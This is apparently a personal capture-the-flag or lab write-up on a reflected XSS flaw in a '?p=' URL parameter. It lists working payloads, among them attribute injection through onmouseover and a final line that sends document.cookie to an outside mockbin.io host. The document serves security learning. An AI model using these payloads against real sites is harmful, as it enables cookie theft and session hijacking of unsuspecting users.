# XSS - Reflected

## Initial Attempt

No way to inject any code on the first look, no forms, no inputs but then I realized the menu redirects using the `?p=` parameter.

```javascript
p=<img src=x onerror="alert(1);" />
```

Problem: Nothing happens

## Adding events

So I tried a lot of payloads but none of them seemed to work, it would just print as it is. However injecting the payload as attribute did work.

```javascript
?p=exp' onmouseover='alert(1)
```

Had to encode the quotes as `%22` for this to work else the quotes would just get paired up when rendered in html

```javascript
?p=xss' 'onmouseover='fetch(%22https://b5e02d613ca44b7384e0290125a1448e.api.mockbin.io/?cook=%22.concat(document.cookie))
```

## Notes

Solutions mentioned on the website offer very creative ways to harvest the cookie

## References

- [php's htmlspecialchars()](https://www.php.net/manual/en/function.htmlspecialchars.php)
- [Relative Path Override](http://www.thespanner.co.uk/2014/03/21/rpo/)
- [shelld3v/JSshell](https://github.com/shelld3v/JSshell)
